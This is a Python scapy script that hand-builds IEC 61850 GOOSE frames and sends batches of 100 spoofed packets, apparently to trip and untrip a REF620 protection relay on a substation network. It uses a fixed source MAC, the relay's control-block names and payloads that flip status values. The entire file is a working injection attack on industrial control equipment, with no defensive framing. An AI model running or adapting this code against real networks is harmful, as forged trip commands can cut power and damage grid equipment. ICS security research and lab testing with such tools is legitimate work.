from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.ntp import TimeStampField
import datetime
from binascii import unhexlify

PACKET_QTY = 100
st_num = 444

def num2str(num):
    bytestring = bytearray()
    if num // 256 // 256 // 256 // 256 % 256 > 0:
        bytestring.append(num // 256 // 256 // 256 // 256 % 256)
    if num // 256 // 256 // 256 % 256 > 0:
        bytestring.append(num // 256 // 256 // 256 % 256)
    if num // 256 // 256 % 256 > 0:
        bytestring.append(num // 256 // 256 % 256)
    if num // 256 % 256 > 0:
        bytestring.append(num // 256 % 256)
    bytestring.append(num % 256)
    return bytestring


class GooseHeader(Packet):
    name = "Goose Header"
    fields_desc = [ShortField("appid", 1),
                   ShortField("length", 0),
                   ShortField("reserved1", None),
                   ShortField("reserved2", None)]


class GoosePDU(Packet):
    name = "Goose PDU"
    fields_desc = [ByteField("sequence_t", 0x61),
                   ConditionalField(ByteField("sequence_el", 0x81), lambda pkt: pkt.sequence_l > 127),
                   ByteField("sequence_l", 0),
                   ByteField("gocbRef_t", 0x80),
                   FieldLenField("gocbRef_l", None, length_of="gocbRef", fmt="B"),
                   StrLenField("gocbRef", None, length_from=lambda pkt: pkt.gocbRef_l),
                   ByteField("timeAllowedtoLive_t", 0x81),
                   FieldLenField("timeAllowedtoLive_l", None, length_of="timeAllowedtoLive", fmt="B"),
                   StrLenField("timeAllowedtoLive", None, length_from=lambda pkt: pkt.timeAllowedtoLive_l),
                   ByteField("datSet_t", 0x82),
                   FieldLenField("datSet_l", None, length_of="datSet", fmt="B"),
                   StrLenField("datSet", None, length_from=lambda pkt: pkt.datSet_l),
                   ByteField("goID_t", 0x83),
                   FieldLenField("goID_l", None, length_of="goID", fmt="B"),
                   StrLenField("goID", None, length_from=lambda pkt: pkt.goID_l),
                   ByteField("T_t", 0x84),
                   ByteField("T_l", 8),
                   TimeStampField("T", None),
                   ByteField("stNum_t", 0x85),
                   FieldLenField("stNum_l", None, length_of="stNum", fmt="B"),
                   StrLenField("stNum", None, length_from=lambda pkt: pkt.stNum_l),
                   ByteField("sqNum_t", 0x86),
                   FieldLenField("sqNum_l", None, length_of="sqNum", fmt="B"),
                   StrLenField("sqNum", None, length_from=lambda pkt: pkt.sqNum_l),
                   ByteField("simulation_t", 0x87),
                   ByteField("simulation_l", 1),
                   ByteField("simulation", None),
                   ByteField("confRev_t", 0x88),
                   FieldLenField("confRev_l", None, length_of="confRev", fmt="B"),
                   StrLenField("confRev", None, length_from=lambda pkt: pkt.confRev_l),
                   ByteField("ndsCom_t", 0x89),
                   ByteField("ndsCom_l", 1),
                   ByteField("ndsCom", None),
                   ByteField("numDatSetEntries_t", 0x8a),
                   FieldLenField("numDatSetEntries_l", None, length_of="numDatSetEntries", fmt="B"),
                   StrLenField("numDatSetEntries", None, length_from=lambda pkt: pkt.numDatSetEntries_l)
                   ]


def ref620_trip_packet(st_num):
    ethernet_mac = Ether(src='00:21:c1:22:c8:77', dst='01:0c:cd:01:00:03', type=0x88b8)
    goose_pdu = GoosePDU(gocbRef="REF62030LD0/LLN0$GO$gcbREF620",
                         timeAllowedtoLive=num2str(20000),
                         datSet="REF62030LD0/LLN0$REF620",
                         goID="REF62030LD0/LLN0.gcbREF620",
                         T=datetime.datetime.now(datetime.timezone.utc).timestamp(),
                         stNum=num2str(st_num),
                         sqNum=num2str(0),
                         simulation=0,
                         confRev=num2str(700),
                         ndsCom=0,
                         numDatSetEntries=num2str(4)
                         )
    goose_data = unhexlify("ab1084030300008301008403030000830101")
    goose_pdu.sequence_l = (len(goose_pdu) + len(goose_data) - 2)
    goose_header = GooseHeader(appid=4, length=len(goose_pdu) + len(goose_data) + 8)
    goose_packet = ethernet_mac / goose_header / goose_pdu / goose_data
    return goose_packet

def ref620_untrip_packet(st_num):
    ethernet_mac = Ether(src='00:21:c1:22:c8:77', dst='01:0c:cd:01:00:03', type=0x88b8)
    goose_pdu = GoosePDU(gocbRef="REF62030LD0/LLN0$GO$gcbREF620",
                         timeAllowedtoLive=num2str(20000),
                         datSet="REF62030LD0/LLN0$REF620",
                         goID="REF62030LD0/LLN0.gcbREF620",
                         T=datetime.datetime.now(datetime.timezone.utc).timestamp(),
                         stNum= num2str(st_num),
                         sqNum=num2str(0),
                         simulation=0,
                         confRev=num2str(700),
                         ndsCom=0,
                         numDatSetEntries=num2str(4)
                         )
    goose_data = unhexlify("ab1084030300008301018403030000830100")
    goose_pdu.sequence_l = (len(goose_pdu) + len(goose_data) - 2)
    goose_header = GooseHeader(appid=4, length=len(goose_pdu) + len(goose_data) + 8)
    goose_packet = ethernet_mac / goose_header / goose_pdu / goose_data
    return goose_packet

def ref620_trip(INTERFACE):
    global st_num
    for i in range(PACKET_QTY):
        st_num = st_num+1
        pkt = ref620_trip_packet(st_num)
        sendp(pkt, iface=INTERFACE)
    return "DONE"


def ref620_untrip(INTERFACE):
    global st_num
    for i in range(PACKET_QTY):
        st_num = st_num + 1
        pkt = ref620_untrip_packet(st_num)
        sendp(pkt, iface=INTERFACE)
    return "DONE"